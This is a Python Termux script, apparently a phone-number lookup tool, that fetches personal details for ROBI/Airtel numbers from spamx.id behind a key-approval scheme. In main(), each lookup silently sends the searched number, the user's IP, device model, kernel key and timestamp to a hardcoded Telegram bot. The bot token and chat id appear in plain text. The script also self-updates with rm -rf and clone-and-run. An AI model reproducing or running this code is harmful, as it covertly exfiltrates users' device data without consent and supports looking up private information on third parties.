try:
	import requests
	import sys
	import os
	import pyshorteners
	import time
	import subprocess
except:
	os.system("pip install requests pyshorteners bs4")

import json
import shutil
import requests
import sys
import os
import pyshorteners
import time
import subprocess
from requests.structures import CaseInsensitiveDict
from datetime import datetime
now = datetime.now()
datetime = now.strftime("%d/%m/%Y, %H:%M:%S")
model = subprocess.run(["getprop", "ro.product.model"], capture_output=True, text=True).stdout.strip()

shutil.get_terminal_size().columns
fs = shutil.get_terminal_size().columns

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White
# You Can Change The Key's Name. But don't Change The Values.

# Reset
color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White

# Underline
ublack="\033[4;30m"       # Black
ured="\033[4;31m"         # Red
ugreen="\033[4;32m"       # Green
uyellow="\033[4;33m"      # Yellow
ublue="\033[4;34m"        # Blue
upurple="\033[4;35m"      # Purple
ucyan="\033[4;36m"        # Cyan
uwhite="\033[4;37m"       # White

# Background
on_black="\033[40m"       # Black
on_red="\033[41m"         # Red
on_green="\033[42m"       # Green
on_yellow="\033[43m"      # Yellow
on_blue="\033[44m"        # Blue
on_purple="\033[45m"      # Purple
on_cyan="\033[46m"        # Cyan
on_white="\033[47m"       # White

# High Intensty
iblack="\033[0;90m"       # Black
ired="\033[0;91m"         # Red
igreen="\033[0;92m"       # Green
iyellow="\033[0;93m"      # Yellow
iblue="\033[0;94m"        # Blue
ipurple="\033[0;95m"      # Purple
icyan="\033[0;96m"        # Cyan
iwhite="\033[0;97m"       # White

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

# High Intensty backgrounds
on_iblack="\033[0;100m"   # Black
on_ired="\033[0;101m"     # Red
on_igreen="\033[0;102m"   # Green
on_iyellow="\033[0;103m"  # Yellow
on_iblue="\033[0;104m"    # Blue
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

bicyan = "\033[96m"
bigreen = "\033[92m"
biyellow = "\033[93m"
bipurple = "\033[95m"
bired = "\033[91m"
red="\033[0;31m"          # Red
yellow="\033[0;33m"       # Yellow
green="\033[0;32m"        # Green
color_off="\033[0m"       # Text Reset
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
ured="\033[4;31m"         # Red
on_green="\033[42m"       # Green
blue="\033[0;34m"         # Blue
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"
color_off="\033[0m"       # Text Reset
rst="\033[0m"
b="\033[1;30m"
r="\033[1;31m"
g="\033[1;32m"
yl="\033[1;33m"
bl="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"

os.system("cd $PREFIX/bin && echo 'cd $HOME ; cd NumberToInfo ; python info.py' > numbertoinfo && chmod +x numbertoinfo")


print(cyan+"\n [⌛] "+green+"Please wait...")

key = "━"
line = (key * fs)


	
try:
    apv = requests.get("https://google.com", timeout=4).text
except (requests.ConnectionError, requests.Timeout) as exception:
    os.system("clear")
    print(yl+"\t»"+g+" TOOL NAME	: "+yl+"NUMBER TO INFO"+yl+"\n\t»"+g+" VERSION	: "+yl+"1.0.3"+"\n\t»"+g+" DEVOLOPER	: "+yl+"SH TASRIF"+yl+"\n\t»"+g+" FACEBOOK	: "+yl+"CYBERSHBD"+yl+"\n\t»"+g+" TELEGRAM	: "+yl+"@CYBERSHBD")
    print(c+line)
    print(r+" [!] Oops, It looks like you have no Internet [!]\n")
    print(p+" [✓] Please connect to the internet and try again...\n")
    sys.exit()




def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]
ip=(get_ip())




uname = os.uname()[2]
aprk = str(uname)

url = "https://raw.githubusercontent.com/ShTasrif/NumberToInfo/main/.admin/approval.json"

resp=requests.get(url).text

data = json.loads(resp)
try:
	name = (data[aprk])
except:
	name = "Not Approved"

apv = requests.get("https://raw.githubusercontent.com/ShTasrif/NumberToInfo/main/.admin/premium.txt").text

if aprk in apv:  # Assuming 'aprk' is defined elsewhere in your code
    status = "PREMIUM"
else:
    status = "FREE"

def header():
    os.system("clear")
    print(yl+"\t»"+g+" TOOL NAME	: "+yl+"NUMBER TO INFO"+yl+"\n\t»"+g+" VERSION	: "+yl+"1.0.3"+"\n\t»"+g+" STATUS	: "+yl+status+yl+"\n\t»"+g+" DEVOLOPER	: "+yl+"SH TASRIF"+yl+"\n\t»"+g+" FACEBOOK	: "+yl+"CYBERSHBD"+yl+"\n\t»"+g+" TELEGRAM	: "+yl+"@CYBERSHBD")
    print(bl+line)
    print(red+"\t  IP : "+green+ip+yl+" | "+cyan+"NAME : "+green+name)
    print(bl+line)




def updator():
	header()
	print(c+"\t        [•]Checking For Updates...\n")
	version = open(".version.txt", "r")
	mainversion = requests.get("https://raw.githubusercontent.com/ShTasrif/NumberToInfo/main/.version.txt")
	time.sleep(0.6)
	
	if(version.read() == mainversion.text):
		print(g+"   You are using the latest version of NUMBER TO INFO")
		time.sleep(2)
		
	else:
		print(' ')
		print(' ')
		print(r+"\n\n\t\t[✓]Tool Update Found")
		print(bl+"\n\n\t\t   Updating Tool...")
		os.system("cd .. && rm -rf NumberToInfo && git clone https://github.com/ShTasrif/NumberToInfo > /dev/null 2>&1 && cd NumberToInfo && python info.py")
#=============MAIN===============

def main():
	header()
	number = str(input(yl + "┏━━━━"+red+"["+g+"ROBI/AIRTEL"+r+"]"+yl+"━━━━"+p+"●"+w+"❯"+g+"❯"+c+"❯\n"+yl+"┗━━━━"+w+"●"+p+"❯"+g+"❯"+c+"❯ "+ biyellow))
	
	url = "https://spamx.id/info/?sim="+number
	
	resp = requests.get(url)
	response= resp.text
	json_object = json.loads(response)
	pjson = json.dumps(json_object, indent=1)
	
	header()
	print(c+pjson)
	print(bl+line)
	
	msg = ("━━━━━━━━NUMBER━INFO━━━━━━━━\n"+"Number : "+number+"\nFinder Name : "+name+"\nUser IP : "+ip+"\nTimestamp : "+datetime+"\n━━━━━━━━DEVICE KEY━━━━━━━━\n"+"Key = "+str(aprk)+"\n━━━━━━━━DEVICE INFO━━━━━━━━\n"+"Device Model : "+model+"\n━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	tgmsg = "https://api.telegram.org/bot5797264734:AAGOn65GaUIwIUzWk2B_dtiXSXqqqLHoVYA/sendMessage?chat_id=1251593717&text="+msg
	requests.get(tgmsg)
	
	print("\n\t   ",cyan+"[",green+"Now Press",yellow+"Enter",green+" Key To Continue",cyan+"]")
	a = input()

#=============SUBSCRIPTION========	
def Subscription():
	key1 = aprk
	#open('/data/data/com.termux/files/usr/bin/.cybersh-sms-bombing', 'r').read()
	header()
	psb(cyan+"\n\t     Please Wait Checking Approval...")
	os.system("xdg-open https://www.facebook.com/groups/356065192713979")
	
	r1=requests.get("https://raw.githubusercontent.com/ShTasrif/NumberToInfo/main/.admin/approval.json").text

	if key1 in r1:
		main()
		
	else:
		
		header()
		
		
		print ("")
		psb(red+" Your Key is Not Approved Copy And Send Key To Admin")
		print("")
		
		print ("")
		os.system("xdg-open https://t.me/cybersh_official")
		psb (yellow+" Your Key : "+green+key1)
		print ("")
		name = input(purple+" [•] Enter Your Name : "+green)
		print ("")
		lol = input(cyan+" [•] Enter Your Email : "+green)
		print ("")
		input(yellow+" \n\t         Press Enter To Send Key ")
		time.sleep(2.5)
		tks = 'Assalamu%20Alaikum%20CyberSH%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20CUSTOM-SMS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'''+aprk+name
		os.system('am start https://wa.me/8801644006764/?text=' + tks)
		Subscription()

def done():
	updator()
	
	while True:
		Subscription()
done()